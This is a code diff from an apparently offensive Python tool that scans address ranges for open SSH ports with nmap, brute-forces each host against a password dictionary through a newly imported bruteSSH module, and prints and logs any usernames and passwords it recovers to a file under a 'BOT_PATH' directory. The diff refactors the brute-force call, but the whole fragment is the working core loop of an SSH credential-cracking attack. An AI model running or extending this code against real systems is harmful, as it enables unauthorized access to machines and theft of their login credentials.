@@ -5,6 +5,7 @@ __author__ = "riverchu"
 import optparse
 from operate import *
 from scan.nmapscan import *
+from brute import bruteSSH
 
 
 def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CONNECTIONS):
@@ -25,15 +26,16 @@ def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CON
 
         ssh_scan = RiverNmapScan()
 
-        for open_host_info in ssh_scan.scan_async(host, 22, 'ssh'):
-            print('[*] Start brute ', open_host_info['ip'])
+        for host_info in ssh_scan.scan_async(host, 22, 'ssh'):
+            print('[*] Start brute ', host_info['ip'])
 
-            brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
+            brute_ret = bruteSSH.brute_ssh(host=host_info['ip'], user=user,
+                                           passwd_file=dictionary, max_connection=thread_num)
             save_info(mode='scan_log', filename=gv.BOT_PATH + 'scan.log', info=brute_ret)
             if brute_ret['key'] is None:
                 continue
 
-            print('[+] Brute ' + open_host_info['ip'] + ' result:',
+            print('[+] Brute ' + host_info['ip'] + ' result:',
                   'user: ' + brute_ret['user'],
                   'password: ' + brute_ret['key'])
 
